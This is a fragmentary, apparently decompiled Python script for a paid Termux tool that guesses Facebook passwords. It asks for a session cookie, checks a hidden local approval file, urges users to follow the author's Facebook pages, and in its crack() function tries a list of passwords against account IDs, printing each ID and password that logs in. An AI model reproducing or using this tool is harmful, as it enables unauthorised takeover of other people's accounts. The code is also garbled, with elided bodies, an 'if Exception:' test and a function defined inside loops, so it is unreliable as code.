...
if Exception:
    ...
    for xd in range(10000):
        ...
        for x in range(10):
            ...
            def Subscraption():
                ak = 'VEER'
                key1 = open('/data/data/com.termux/files/usr/bin/.approval-cov', 'r').read()
                clear()
                print(logo)
            ...
            logo = '   \n \x1b[1;37m ######  ##     ## ##     ##    ###    ##    ##  \n  \x1b[1;31m##    ## ##     ## ###   ###   ## ##   ###   ## \n  \x1b[1;33m##       ##     ## #### ####  ##   ##  ####  ## \n  \x1b[1;36m######  ##     ## ## ### ## ##     ## ## ## ##  \n  \x1b[1;30m ## ##     ## ##     ## ######### ##  ####   \n   \x1b[1;32m ##    ## ##     ## ##     ## ##     ## ##   ##  \n    \x1b[1;34m ######   #######  ##     ## ##     ## ##    ##    \n\x1b[1;37m------------------------\x1b[1;37m------------------------\n\x1b[1;31m\x1b[1;37m➣ Author \x1b[1;97m     : \x1b[1;37m      MD SUMAN HOSSAIN\n\x1b[1;31m\x1b[1;37m➣ Facebook\x1b[1;97m    :  \x1b[1;37m     Suman.love420\n\x1b[1;31m\x1b[1;37m➣ Version\x1b[1;97m     : \x1b[1;37m      3.0.1  \n\x1b[1;31m\x1b[1;37m➣ LIFE STATUS\x1b[1;97m : \x1b[1;37m      PAID (🔐🔐)\n\x1b[1;37m------------------------\x1b[1;37m------------------------ '
            print(logo)
    ...
    print('-----------------------------------------------')
    jalan('\n%s %s%s Welcome To Veer paid Tool.....' % (P, M, P))
    print('-----------------------------------------------')
    cookie = input('\n [+] Put Cookie : ')
...
def menu(my_name, my_id):
    ...
    print(logo)
    print('')
    print('\x1b[1;37m [1] First Follow MY FACEBOOK ')
    print('\x1b[1;37m [2] Follow My Fb GROUP')
...
def crack(idf, pwv, nmf):
    ...
    for pw in pwv:
        ...
        if 'c_user' in ses.cookies.get_dict().keys():
            ...
            month = dec_ttl[month]
            print(f'''\r\x1b[1;92m [SUMAN-OK] {idf} | {pw}''')
